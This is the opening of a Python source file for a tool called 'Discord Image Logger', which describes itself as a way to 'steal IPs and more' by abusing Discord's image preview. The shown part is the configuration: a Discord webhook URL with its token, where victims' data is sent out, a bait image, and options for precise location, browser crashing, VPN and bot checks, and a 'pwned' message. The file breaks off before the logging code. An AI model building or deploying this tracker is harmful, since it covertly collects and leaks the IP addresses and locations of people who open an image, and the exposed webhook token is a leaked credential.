from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    
    "webhook": "https://discord.com/api/webhooks/1354371100406054974/F3B-8bard39Tq5Ygq20g3Yl7Iso7f7eZjNc88GTSHoQB3JwHPg3Th6gO72uhLP4UjEuK",
    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSVOFWiQ0ATLAlOoPbpx4ixlalH5dEpcewMkw&s",
                                               
    "imageArgument": True,

    
    "username": "Image Logger", 
    "color": 0x00FFFF, 

    
    "crashBrowser": False, 
    
    "accurateLocation": True, 

    "message": { 
        "doMessage": False, 
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", 
        "richMessage": True, 
    },

    "vpnCheck": 1, 
                
                
                

    "linkAlerts": True, 
    "buggedImage": True, 

    "antiBot": 1, 
                
                
                
                
                
    

    
    "redirect": {
        "redirect": False, 
        "page": "https://your-link.here" 
    },
